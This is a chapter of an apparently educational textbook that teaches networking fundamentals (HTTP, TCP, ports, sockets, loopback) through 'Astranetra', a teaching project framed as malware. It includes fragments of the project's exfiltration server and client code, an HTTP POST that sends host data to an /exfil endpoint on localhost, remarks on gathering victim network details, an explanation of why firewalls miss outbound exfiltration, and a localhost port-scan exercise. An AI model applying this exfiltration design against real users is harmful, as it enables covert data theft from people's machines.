# Astranetra: Core CS Concepts

---

# Chapter 8 — Networking Isn't Magic Either

> **Reading time:** ~22 minutes
> **Prerequisites:** Chapter 1 (System Calls)
> **Next chapter:** Chapter 9 — Databases: Structured Persistence

---

## The Hook

Astranetra scans your files, reads your system info, and then... sends it all to a server. 

In two lines of code, it exfiltrates the data. But what does "send data to a server" actually *mean*? 

When you `POST` a JSON payload to `localhost:4444`, where does that data physically go? What cable does it travel through? What if there is no cable? What is a "port", really? 

You probably use `fetch()` or `axios` every day. But beneath those clean JavaScript functions is a dense, multi-layered stack of operating system protocols. This chapter traces the journey of a single HTTP request from your JavaScript variable, through every layer of the networking stack, and out to the world.

---

## The Mental Model — The Postal System

To understand computer networking, think of the international postal system.

- **IP Address (The Building):** To send mail to a skyscraper, you need its street address. This is the IP address. It gets the data to the correct building (computer) anywhere in the world.
- **Port Number (The Apartment):** The building has 65,535 apartments inside. Delivering mail to the lobby isn't enough; you must specify apartment 4444. This is the port number. It gets the data to the correct *program* running on that computer.
- **TCP (Registered Mail):** When you send sensitive documents, you want a guarantee they arrived, and you want them delivered in the exact order you sent them. TCP ensures reliable, ordered delivery.
- **UDP (Postcards):** Sometimes you just want to blast out quick updates (like a live video stream) and you don't care if a few postcards get lost in the mail. UDP is fast but unreliable.
- **HTTP (The Language):** The actual letter inside the envelope is written in a specific language format that the recipient understands. This is HTTP.

---

## The Mechanism — Layers of the Stack

When you make a web request, your data doesn't just shoot out of the Wi-Fi antenna. It travels down a strict hierarchy called the **OSI Model** (or the TCP/IP stack). We'll focus on the four layers that matter most to developers.

### 1. The Application Layer (HTTP)

At the very top is your JavaScript. When you use the `http` module, you are crafting an HTTP request. HTTP is just plain text formatted in a very specific way. 

An HTTP POST request looks exactly like this under the hood:

```http
POST /exfil HTTP/1.1
Host: localhost:4444
Content-Type: application/json
Content-Length: 42

{"hostname":"Adarsh-PC","files_found":5}
```

* **Request Line:** `METHOD PATH VERSION`
* **Headers:** Key-value pairs providing metadata. `Content-Length` is critical—it tells the server exactly how many bytes to wait for.
* **Empty Line:** A mandatory blank line telling the server that the headers are done.
* **Body:** The actual payload.

### 2. The Transport Layer (TCP & Ports)

Your OS doesn't understand HTTP. It just sees raw bytes. It passes these bytes down to the Transport layer, typically TCP.

Before TCP can send your data, it must establish a connection. This is the famous **Three-Way Handshake**:
1. Client sends `SYN` (Synchronize? Are you there?)
2. Server replies `SYN-ACK` (Yes I am, I acknowledge you. Are you there?)
3. Client replies `ACK` (Yes, I acknowledge you. Let's talk.)

Once connected, TCP takes your HTTP text, slices it into smaller chunks called **segments**, assigns them sequence numbers (so they can be reassembled in order), and prepares to send them to a **Port**.

A port is a 16-bit number (0 to 65535). 
- **0-1023** are reserved well-known ports (80 for HTTP, 443 for HTTPS).
- When you send a request, your OS assigns your browser an ephemeral port (e.g., 50123) so the server knows where to reply.

**What is a Socket?**
A socket is an OS-level endpoint. It is defined by three things: `IP + Port + Protocol`. When a program wants to use the network, it asks the kernel for a socket (via a system call). The kernel hands back a **File Descriptor** (an integer). To the OS, sending data over a network is exactly the same as writing to a file!

### 3. The Network Layer (IP)

TCP hands the segments down to the Network layer. Here, the segments are wrapped in **IP Packets**. 

The Network layer stamps the packet with a Source IP (your computer) and a Destination IP (the server). This layer is responsible for routing—figuring out how to navigate the massive, messy web of global routers to reach the destination.

**What is `localhost` (127.0.0.1)?**
Astranetra sends data to `localhost`. This is the loopback interface. When the Network layer sees `127.0.0.1`, it essentially says, "Oh, this is for me." It skips the physical network card entirely and routes the packet straight back up the stack to the listening port. It's an internal shortcut.

### 4. The Link Layer (Physical/Ethernet/Wi-Fi)

Finally, the IP packets are converted into electrical signals over a copper wire, light pulses in fiber optics, or radio waves over Wi-Fi. 

### Why Firewalls Don't Stop Exfiltration

You might wonder: "I have a firewall. Why does it let malware send my passwords to the internet?"

Firewalls are designed to block *incoming* connections. If an attacker tries to reach into your computer from the outside, the firewall blocks it. 

But firewalls generally allow all *outgoing* connections on port 80 (HTTP) and 443 (HTTPS). If they blocked those, your web browser would stop working! Because Astranetra (and most malware) initiates the connection from the *inside*, and formats it as standard HTTP traffic, the firewall assumes it's just a regular web browser and lets it pass right through.

---

## The Experiment — Bare Metal HTTP

Let's see what HTTP actually looks like without Express.js or `fetch()` hiding it from you. We'll use the raw `net` module (which speaks raw TCP).

Create `raw_http.js`:

```javascript
import net from 'net';

// Start a raw TCP server
const server = net.createServer((socket) => {
    console.log("--- RAW BYTES RECEIVED FROM CLIENT ---");
    
    socket.on('data', (data) => {
        console.log(data.toString()); // Print the exact text the client sent
        
        // Write a raw HTTP response back
        const response = 
            "HTTP/1.1 200 OK\r\n" +
            "Content-Type: text/plain\r\n" +
            "Connection: close\r\n\r\n" +
            "Hello from the raw TCP server!";
            
        socket.write(response);
        socket.destroy(); // Close the connection
    });
});

server.listen(4444, () => {
    console.log("Raw TCP Server listening on port 4444");
    
    // Now make a request to it using standard fetch
    console.log("Making a fetch() request to the server...\n");
    fetch('http://localhost:4444/my-secret-path', {
        method: 'POST',
        headers: { 'X-Custom-Header': 'Astranetra' },
        body: JSON.stringify({ secret: "data" })
    })
    .then(res => res.text())
    .then(text => console.log("\n--- BROWSER RECEIVED ---\n" + text));
});
```

Run it. Look at the raw bytes printed. You'll see exactly how `fetch()` constructs the HTTP protocol string behind the scenes.

---

## The Astranetra Connection

Astranetra's exfiltration relies entirely on standard HTTP.

### The Server Side
In `server/exfilServer.js`, we use `express`:

```javascript
// server/exfilServer.js (L12-25)
app.post('/exfil', (req, res) => {
    const payload = req.body;
    receivedPayloads.push(payload);
    // ...
});
```
Express.js is a framework that sits on top of Node's `http` module, which sits on top of Node's `net` module. When you call `app.post`, Express asks the OS to bind a socket to port `4444`. The kernel listens. When TCP packets arrive on 4444, the kernel reassembles them, passes them to Node, Express parses the HTTP headers, reads the `Content-Length`, grabs the JSON body, and gives it to your `req.body` variable.

At line 9, we see `express.json({ limit: '50mb' })`. Why is this necessary? Because if a malware scan finds 40MB of data, the HTTP body will be huge. By default, Express rejects large bodies to prevent Denial of Service (DoS) attacks. We explicitly configure the server to accept massive payloads.

### The Client Side
In `core/ExfilEngine.js`, Astranetra acts as the attacker's client.

```javascript
// core/ExfilEngine.js (L55-95)
const options = {
    hostname: host,
    port: port,
    path: '/exfil',
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payloadStr)
    }
};

const req = http.request(options, (res) => { ... });
```
Notice we manually calculate the `Content-Length` using `Buffer.byteLength(payloadStr)`. If this number is wrong, the server will either chop off the end of your data, or hang forever waiting for bytes that will never arrive.

The `SystemRecon.js` module (lines 31-47) also uses `os.networkInterfaces()` to query the OS for your IP addresses, MAC addresses, and subnet masks. It grabs this info directly from the OS kernel to build the victim's profile.

---

## The Deeper Questions

1. **HTTPS and TLS:** Astranetra uses plain HTTP. If you intercept the Wi-Fi traffic, you can read the JSON payload in plain text. How does HTTPS work? How do certificates and public-key cryptography hide the HTTP body from routers in the middle?
2. **DNS:** We used `localhost` or an IP address. But when you type `google.com`, how does the computer know the IP address? (Look up the Domain Name System).
3. **NAT (Network Address Translation):** If you run Astranetra, your IP is probably something like `192.168.1.5`. But if you google "What is my IP", you get a completely different number. Why? How does your home router juggle 10 devices sharing one public IP?

---

## Challenge Problem

Write a Node.js script that performs a "Port Scan" on your own `localhost`. 

Loop from port 1 to 1024, attempting to create a TCP connection (`net.createConnection()`) to each one. If the connection succeeds, log that the port is "OPEN". If it fails, catch the error and move on. 

*Warning: Only run this against localhost. Running port scans against external servers you don't own can trigger intrusion detection systems and get your IP banned by ISPs.*

---

> **Next Chapter: Databases — Structured Persistence**
>
> Now that Astranetra has successfully shipped the stolen data across the network, the attacker's server needs to save it. You might think we can just dump it into a JSON file. For one computer, maybe. But what if 10,000 computers get infected at the exact same time? Chapter 9 explains why JSON files fail under pressure, and why Databases exist.
